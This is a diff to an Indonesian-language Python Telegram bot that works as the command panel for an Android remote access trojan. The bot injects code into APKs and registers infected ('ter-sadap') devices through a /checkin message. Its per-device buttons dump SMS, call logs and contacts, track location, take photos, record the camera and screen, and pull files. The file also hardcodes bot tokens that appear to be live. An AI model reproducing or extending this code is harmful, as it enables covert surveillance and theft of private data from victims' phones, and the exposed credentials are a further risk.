@@ -13,10 +13,10 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 # ── KONFIGURASI ──
 TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
 PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
-PAYLOAD_BOT_USERNAME = "Hasil_rat_bot" # GANTI INI
+PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadKamu" # GANTI INI
 
 ALLOWED_CHAT_ID = "8598136412" 
-GROUP_ID = "-1004405270823" # ID Grup kamu
+GROUP_ID = "-1004405270823" 
 
 WORK_DIR = "/data/data/com.termux/files/home/r4t" 
 KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
@@ -121,7 +121,6 @@ def inject_permission_popup(apk_out_dir):
                         if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 5}\n"
                         else: lines[j] = f"    .registers {int(parts[1]) + 5}\n"
                         
-                        # Panggil askPermissions & setAlarm (BootReceiver.setAlarm)
                         inject_code = (
                             "\n    const-string v4, \"Injection Active\"\n"
                             "    const/4 v5, 0x1\n"
@@ -171,7 +170,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             keyboard = []
             for idx, dev in enumerate(devices[:5]):
-                keyboard.append([InlineKeyboardButton(f"📱 {dev}", callback_data=f"device_{idx}")])
+                keyboard.append([InlineKeyboardButton(f"📱 {dev['name']}", callback_data=f"device_{idx}")])
             keyboard.append([InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")])
             await query.edit_message_text(f"📱 **List Device Ter-Sadap ({len(devices)} HP)**\n\nPilih device:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
@@ -194,23 +193,34 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "back_start": await start(update, context)
         
     elif query.data.startswith("device_"):
-        keyboard = [
-            [InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📤 Send File", callback_data="cmd_send_file")],
-            [InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms"), InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon")],
-            [InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak"), InlineKeyboardButton("📍 Lacak Lokasi", callback_data="cmd_lacak")],
-            [InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan"), InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],
-            [InlineKeyboardButton("🎥 Rekam Depan", callback_data="cmd_rekam_depan"), InlineKeyboardButton("🎥 Rekam Belakang", callback_data="cmd_rekam_belakang")],
-            [InlineKeyboardButton("🖼️ Screenshot", callback_data="cmd_ss"), InlineKeyboardButton("⏺️ Screen Record", callback_data="cmd_screen_record")],
-            [InlineKeyboardButton("🌐 Buka URL", callback_data="cmd_buka_url")],
-            [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
-        ]
-        await query.edit_message_text("🎮 **Menu Kontrol**\nPilih aksi:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        idx = int(query.data.split("_")[1])
+        devices = load_devices()
+        if idx < len(devices):
+            dev = devices[idx]
+            keyboard = [
+                [InlineKeyboardButton("📂 Cek File", callback_data=f"cmd_cek_file_{idx}"), InlineKeyboardButton("📤 Send File", callback_data=f"cmd_send_file_{idx}")],
+                [InlineKeyboardButton("📩 Dump SMS", callback_data=f"cmd_dump_sms_{idx}"), InlineKeyboardButton("📞 Dump Telpon", callback_data=f"cmd_dump_telpon_{idx}")],
+                [InlineKeyboardButton("👥 Dump Kontak", callback_data=f"cmd_dump_kontak_{idx}"), InlineKeyboardButton("📍 Lacak Lokasi", callback_data=f"cmd_lacak_{idx}")],
+                [InlineKeyboardButton("📸 Foto Depan", callback_data=f"cmd_foto_depan_{idx}"), InlineKeyboardButton("📷 Foto Belakang", callback_data=f"cmd_foto_belakang_{idx}")],
+                [InlineKeyboardButton("🎥 Rekam Depan", callback_data=f"cmd_rekam_depan_{idx}"), InlineKeyboardButton("🎥 Rekam Belakang", callback_data=f"cmd_rekam_belakang_{idx}")],
+                [InlineKeyboardButton("🖼️ Screenshot", callback_data=f"cmd_ss_{idx}"), InlineKeyboardButton("⏺️ Screen Record", callback_data=f"cmd_screen_record_{idx}")],
+                [InlineKeyboardButton("🌐 Buka URL", callback_data=f"cmd_buka_url_{idx}")],
+                [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
+            ]
+            await query.edit_message_text(f"🎮 **Kontrol: {dev['name']}**\nID: `{dev['id']}`\n\nPilih aksi:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
     elif query.data.startswith("cmd_"):
-        perintah = "/" + query.data.replace("cmd_", "")
-        url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
-        keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
-        await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        parts = query.data.split("_")
+        idx = int(parts[-1])
+        cmd_base = "_".join(parts[1:-1])
+        
+        devices = load_devices()
+        if idx < len(devices):
+            dev_id = devices[idx]['id']
+            perintah = f"/{cmd_base} {dev_id}"
+            url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
+            keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
+            await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 async def handle_checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = str(update.effective_chat.id)
@@ -218,12 +228,14 @@ async def handle_checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     text = update.message.text
     if text.startswith("/checkin "):
-        device_info = text.replace("/checkin ", "").strip()
-        devices = load_devices()
-        if device_info not in devices:
-            devices.append(device_info)
-            save_devices(devices)
-            await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"✅ Device Baru Terhubung: {device_info}\nTotal: {len(devices)} HP.")
+        raw_data = text.replace("/checkin ", "").strip()
+        if "|" in raw_data:
+            dev_name, dev_id = raw_data.split("|")
+            devices = load_devices()
+            if not any(d['id'] == dev_id for d in devices):
+                devices.append({"name": dev_name, "id": dev_id})
+                save_devices(devices)
+                await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"✅ Device Baru: {dev_name}\nID: `{dev_id}`\nTotal: {len(devices)} HP.", parse_mode='Markdown')
 
 async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
     chat_id = str(update.effective_chat.id)
